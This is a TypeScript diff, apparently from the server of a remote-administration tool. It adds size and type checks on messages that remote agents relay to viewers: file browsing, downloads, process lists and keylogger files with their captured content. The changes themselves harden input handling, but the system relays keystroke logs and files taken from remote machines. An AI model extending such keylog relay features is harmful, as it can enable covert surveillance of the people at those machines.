@@ -31,6 +31,288 @@ function boundedBytes(value: unknown, maxBytes: number): Uint8Array | null {
   return bytes.byteLength <= maxBytes ? bytes : null;
 }
 
+export const MAX_FILE_LIST_ENTRIES = 100_000;
+export const MAX_PROCESS_LIST_ENTRIES = 100_000;
+export const MAX_PROCESS_ICON_ITEMS = 32;
+export const MAX_PROCESS_ICON_BYTES = 256 * 1024;
+export const MAX_KEYLOG_FILE_ITEMS = 1_000;
+export const MAX_KEYLOG_CONTENT_BYTES = 64 * 1024 * 1024;
+
+function boundedText(value: unknown, maxLength: number): string {
+  if (typeof value !== "string") return "";
+  return value.slice(0, maxLength).replace(/[\x00-\x1F\x7F]/g, "");
+}
+
+function boundedUtf8Text(value: unknown, maxBytes: number): string | null {
+  if (typeof value !== "string") return null;
+  if (value.length > maxBytes || Buffer.byteLength(value, "utf8") > maxBytes) return null;
+  return value;
+}
+
+function boundedNumber(value: unknown, min = 0, max = Number.MAX_SAFE_INTEGER): number {
+  const parsed = typeof value === "bigint" ? Number(value) : Number(value);
+  if (!Number.isFinite(parsed)) return min;
+  return Math.min(max, Math.max(min, parsed));
+}
+
+function relayCommandId(value: unknown): string | undefined {
+  const commandId = boundedText(value, 128);
+  return commandId || undefined;
+}
+
+function relayPath(value: unknown, allowEmpty = true): string {
+  return isSafeFileBrowserPath(value, allowEmpty) ? value : "";
+}
+
+function baseAgentResult(type: string, payload: any): Record<string, unknown> {
+  const commandId = relayCommandId(payload?.commandId);
+  const pathValue = relayPath(payload?.path);
+  const error = boundedText(payload?.error, 2_048);
+  return {
+    type,
+    ...(commandId ? { commandId } : {}),
+    ...(pathValue ? { path: pathValue } : {}),
+    ...(error ? { error } : {}),
+  };
+}
+
+export function normalizeFileBrowserAgentMessage(payload: any): Record<string, unknown> | null {
+  const type = typeof payload?.type === "string" ? payload.type : "";
+  if (!type) return null;
+  const base = baseAgentResult(type, payload);
+
+  switch (type) {
+    case "file_list_result": {
+      const entries = Array.isArray(payload.entries)
+        ? payload.entries.slice(0, MAX_FILE_LIST_ENTRIES).flatMap((entry: any) => {
+            if (!entry || !isSafeFileBrowserPath(entry.path)) return [];
+            const name = boundedText(entry.name, 512);
+            if (!name) return [];
+            return [{
+              name,
+              path: entry.path,
+              isDir: entry.isDir === true,
+              size: boundedNumber(entry.size),
+              modTime: boundedNumber(entry.modTime),
+              mode: boundedText(entry.mode, 64),
+              owner: boundedText(entry.owner, 128),
+              group: boundedText(entry.group, 128),
+              attrs: Math.floor(boundedNumber(entry.attrs, 0, 0xffff_ffff)),
+              freeBytes: boundedNumber(entry.freeBytes),
+              totalBytes: boundedNumber(entry.totalBytes),
+              fsType: boundedText(entry.fsType, 64),
+            }];
+          })
+        : [];
+      return {
+        ...base,
+        path: relayPath(payload.path),
+        entries,
+        accessDenied: payload.accessDenied === true,
+        canRequestAccess: payload.canRequestAccess === true,
+        accessHelp: boundedText(payload.accessHelp, 1_024),
+      };
+    }
+    case "file_download": {
+      const data = boundedBytes(payload.data, 4 * 1024 * 1024);
+      if (payload.data && !data) {
+        return { ...base, error: "Download chunk exceeded limit" };
+      }
+      return {
+        ...base,
+        ...(data ? { data } : {}),
+        offset: boundedNumber(payload.offset),
+        total: boundedNumber(payload.total),
+        chunkIndex: Math.floor(boundedNumber(payload.chunkIndex, 0, 1_000_000)),
+        chunksTotal: Math.floor(boundedNumber(payload.chunksTotal, 0, 1_000_000)),
+      };
+    }
+    case "file_upload_result":
+      return {
+        ...base,
+        transferId: boundedText(payload.transferId, 128),
+        ok: payload.ok === true,
+        offset: boundedNumber(payload.offset),
+        size: boundedNumber(payload.size),
+        received: boundedNumber(payload.received),
+        total: boundedNumber(payload.total),
+      };
+    case "file_read_result": {
+      const content = boundedUtf8Text(payload.content, FILE_BROWSER_MAX_READ_BYTES);
+      if (typeof payload.content === "string" && content === null) {
+        return { ...base, error: "File content exceeded editor limit" };
+      }
+      return { ...base, content: content || "", isBinary: payload.isBinary === true };
+    }
+    case "file_search_result": {
+      const results = Array.isArray(payload.results)
+        ? payload.results.slice(0, 500).flatMap((result: any) => {
+            if (!result || !isSafeFileBrowserPath(result.path)) return [];
+            const line = Math.floor(boundedNumber(result.line, 0, 10_000_000));
+            return [{
+              path: result.path,
+              ...(line > 0 ? { line } : {}),
+              match: boundedText(result.match, 4_096),
+            }];
+          })
+        : [];
+      return {
+        ...base,
+        searchId: boundedText(payload.searchId, 128),
+        results,
+        complete: payload.complete === true,
+      };
+    }
+    case "file_icon_result": {
+      const icons = Array.isArray(payload.icons)
+        ? payload.icons.slice(0, FILE_BROWSER_MAX_ICON_ITEMS).flatMap((item: any) => {
+            const key = boundedText(item?.key, 4_224);
+            if (!key) return [];
+            const png = boundedBytes(item?.png, 512 * 1024);
+            return [{ key, ...(png ? { png } : {}), error: boundedText(item?.error, 512) }];
+          })
+        : [];
+      return { ...base, icons };
+    }
+    case "file_thumb_result": {
+      const thumbs = Array.isArray(payload.thumbs)
+        ? payload.thumbs.slice(0, FILE_BROWSER_MAX_THUMB_ITEMS).flatMap((item: any) => {
+            const key = boundedText(item?.key, 4_224);
+            if (!key) return [];
+            const jpeg = boundedBytes(item?.jpeg, 1024 * 1024);
+            return [{
+              key,
+              ...(jpeg ? { jpeg } : {}),
+              w: Math.floor(boundedNumber(item?.w, 0, 512)),
+              h: Math.floor(boundedNumber(item?.h, 0, 512)),
+              error: boundedText(item?.error, 512),
+            }];
+          })
+        : [];
+      return { ...base, thumbs };
+    }
+    case "file_peek_result": {
+      const data = boundedBytes(payload.data, 4_096);
+      if (payload.data && !data) return { ...base, error: "Preview data exceeded limit" };
+      return {
+        ...base,
+        ...(data ? { data } : {}),
+        size: boundedNumber(payload.size),
+        isText: payload.isText === true,
+      };
+    }
+    case "file_dirsize_result":
+      return {
+        ...base,
+        bytes: boundedNumber(payload.bytes),
+        files: boundedNumber(payload.files),
+        dirs: boundedNumber(payload.dirs),
+        done: payload.done === true,
+      };
+    case "file_hash_result":
+      return {
+        ...base,
+        algorithm: boundedText(payload.algorithm, 32),
+        digest: boundedText(payload.digest, 512),
+        size: boundedNumber(payload.size),
+      };
+    case "command_result":
+    case "command_progress":
+      return {
+        ...base,
+        ok: payload.ok === true,
+        message: boundedText(payload.message, 4_096),
+      };
+    default:
+      return null;
+  }
+}
+
+export function normalizeProcessAgentMessage(payload: any): Record<string, unknown> | null {
+  const type = typeof payload?.type === "string" ? payload.type : "";
+  const commandId = relayCommandId(payload?.commandId);
+  const base = { type, ...(commandId ? { commandId } : {}) };
+  if (type === "process_list_result") {
+    const processes = Array.isArray(payload.processes)
+      ? payload.processes.slice(0, MAX_PROCESS_LIST_ENTRIES).flatMap((process: any) => {
+          if (!process || typeof process !== "object") return [];
+          return [{
+            pid: Math.floor(boundedNumber(process.pid, 0, 0xffff_ffff)),
+            ppid: Math.floor(boundedNumber(process.ppid, 0, 0xffff_ffff)),
+            name: boundedText(process.name, 256),
+            exePath: boundedText(process.exePath, 4_096),
+            cpu: boundedNumber(process.cpu, 0, 100_000),
+            memory: boundedNumber(process.memory),
+            username: boundedText(process.username, 256),
+            type: boundedText(process.type, 64),
+            self: process.self === true,
+          }];
+        })
+      : [];
+    return { ...base, processes, error: boundedText(payload.error, 2_048) };
+  }
+  if (type === "process_icon_result") {
+    const icons = Array.isArray(payload.icons)
+      ? payload.icons.slice(0, MAX_PROCESS_ICON_ITEMS).flatMap((item: any) => {
+          const key = boundedText(item?.key, 4_224);
+          if (!key) return [];
+          const png = boundedBytes(item?.png, MAX_PROCESS_ICON_BYTES);
+          return [{ key, ...(png ? { png } : {}), error: boundedText(item?.error, 512) }];
+        })
+      : [];
+    return { ...base, icons };
+  }
+  return null;
+}
+
+export function normalizeKeyloggerAgentMessage(payload: any): Record<string, unknown> | null {
+  const type = typeof payload?.type === "string" ? payload.type : "";
+  switch (type) {
+    case "keylog_file_list": {
+      const files = Array.isArray(payload.files)
+        ? payload.files.slice(0, MAX_KEYLOG_FILE_ITEMS).flatMap((file: any) => {
+            const name = boundedText(file?.name, 255);
+            if (!name || name === "." || name === ".." || name.includes("/") || name.includes("\\")) return [];
+            return [{
+              name,
+              size: boundedNumber(file?.size),
+              date: boundedText(file?.date, 64),
+            }];
+          })
+        : [];
+      return { type, files };
+    }
+    case "keylog_file_content": {
+      const filename = boundedText(payload.filename, 255);
+      const content = boundedUtf8Text(payload.content, MAX_KEYLOG_CONTENT_BYTES);
+      if (
+        !filename
+        || filename === "."
+        || filename === ".."
+        || filename.includes("/")
+        || filename.includes("\\")
+        || content === null
+      ) return null;
+      return { type, filename, content };
+    }
+    case "keylog_clear_result":
+    case "keylog_delete_result":
+    case "keylog_permission_result":
+      return {
+        type,
+        ...(relayCommandId(payload.commandId) ? { commandId: relayCommandId(payload.commandId) } : {}),
+        ok: payload.ok === true,
+        filename: boundedText(payload.filename, 255),
+        error: boundedText(payload.error, 2_048),
+        message: boundedText(payload.message, 2_048),
+        reason: boundedText(payload.reason, 128),
+        granted: payload.granted === true,
+      };
+    default:
+      return null;
+  }
+}
+
 type FileBrowserViewer = {
   id: string;
   clientId: string;
@@ -445,6 +727,8 @@ export function handleFileBrowserMessage(clientId: string, payload: any, deps: W
     return;
   }
   const ownerSessionId = commandOwner?.sessionId;
+  const relayPayload = isHttpDownload ? null : normalizeFileBrowserAgentMessage(payload);
+  if (!isHttpDownload && !relayPayload) return;
 
   let hasSession = false;
   for (const session of sessionManager.getFileBrowserSessionsByClient(clientId)) {
@@ -460,54 +744,7 @@ export function handleFileBrowserMessage(clientId: string, payload: any, deps: W
     if (ownerSessionId && session.id !== ownerSessionId) {
       continue;
     }
-    if (payload.type === "file_download" && payload.data) {
-      const data = boundedBytes(payload.data, 4 * 1024 * 1024);
-      safeSendViewer(session.viewer, data
-        ? { ...payload, data }
-        : { type: "file_download", commandId: payload.commandId, path: payload.path, error: "Download chunk exceeded limit" });
-    } else if (payload.type === "file_icon_result" && Array.isArray(payload.icons)) {
-      const icons = payload.icons.slice(0, FILE_BROWSER_MAX_ICON_ITEMS).flatMap((item: any) => {
-        if (!item || typeof item.key !== "string" || item.key.length > 4224) return [];
-        const png = item.png ? boundedBytes(item.png, 512 * 1024) : null;
-        return [{ key: item.key, ...(png ? { png } : {}), ...(item.error ? { error: String(item.error).slice(0, 512) } : {}) }];
-      });
-      safeSendViewer(session.viewer, { ...payload, icons });
-    } else if (payload.type === "file_thumb_result" && Array.isArray(payload.thumbs)) {
-      const thumbs = payload.thumbs.slice(0, FILE_BROWSER_MAX_THUMB_ITEMS).flatMap((item: any) => {
-        if (!item || typeof item.key !== "string" || item.key.length > 4224) return [];
-        const jpeg = item.jpeg ? boundedBytes(item.jpeg, 1024 * 1024) : null;
-        return [{
-          key: item.key,
-          ...(jpeg ? { jpeg } : {}),
-          w: Math.min(512, Math.max(0, Number(item.w) || 0)),
-          h: Math.min(512, Math.max(0, Number(item.h) || 0)),
-          ...(item.error ? { error: String(item.error).slice(0, 512) } : {}),
-        }];
-      });
-      safeSendViewer(session.viewer, { ...payload, thumbs });
-    } else if (payload.type === "file_peek_result" && payload.data) {
-      const data = boundedBytes(payload.data, 4096);
-      safeSendViewer(session.viewer, data
-        ? { ...payload, data }
-        : { type: "file_peek_result", commandId: payload.commandId, path: payload.path, error: "Preview data exceeded limit" });
-    } else if (payload.type === "file_read_result" && typeof payload.content === "string") {
-      safeSendViewer(session.viewer, payload.content.length <= FILE_BROWSER_MAX_READ_BYTES
-        ? payload
-        : { type: "file_read_result", commandId: payload.commandId, path: payload.path, error: "File content exceeded editor limit" });
-    } else if (payload.type === "file_search_result" && Array.isArray(payload.results)) {
-      const results = payload.results.slice(0, 500).flatMap((result: any) => {
-        if (!result || !isSafeFileBrowserPath(result.path)) return [];
-        const line = Number(result.line);
-        return [{
-          path: result.path,
-          ...(Number.isSafeInteger(line) && line > 0 ? { line } : {}),
-          ...(typeof result.match === "string" ? { match: result.match.slice(0, 4096) } : {}),
-        }];
-      });
-      safeSendViewer(session.viewer, { ...payload, results });
-    } else {
-      safeSendViewer(session.viewer, payload);
-    }
+    safeSendViewer(session.viewer, relayPayload, "filebrowser");
   }
   if (payloadCommandId) {
     const isTerminalDownload = type === "file_download" && (
@@ -595,18 +832,10 @@ export function handleProcessViewerMessage(ws: ServerWebSocket<SocketData>, raw:
 }
 
 export function handleProcessMessage(clientId: string, payload: any) {
+  const relayPayload = normalizeProcessAgentMessage(payload);
+  if (!relayPayload) return;
   for (const session of sessionManager.getProcessSessionsByClient(clientId)) {
-    if (payload.type === "process_icon_result" && Array.isArray(payload.icons)) {
-      const icons = payload.icons.map((item: any) => {
-        if (item && item.png && !(item.png instanceof Uint8Array)) {
-          return { ...item, png: new Uint8Array(item.png) };
-        }
-        return item;
-      });
-      safeSendViewer(session.viewer, { ...payload, icons });
-    } else {
-      safeSendViewer(session.viewer, payload);
-    }
+    safeSendViewer(session.viewer, relayPayload, "processes");
   }
 }
 
@@ -680,7 +909,9 @@ export function handleKeyloggerViewerMessage(ws: ServerWebSocket<SocketData>, ra
 }
 
 export function handleKeyloggerMessage(clientId: string, payload: any) {
+  const relayPayload = normalizeKeyloggerAgentMessage(payload);
+  if (!relayPayload) return;
   for (const session of sessionManager.getKeyloggerSessionsByClient(clientId)) {
-    safeSendViewer(session.viewer, payload);
+    safeSendViewer(session.viewer, relayPayload, "keylogger");
   }
 }
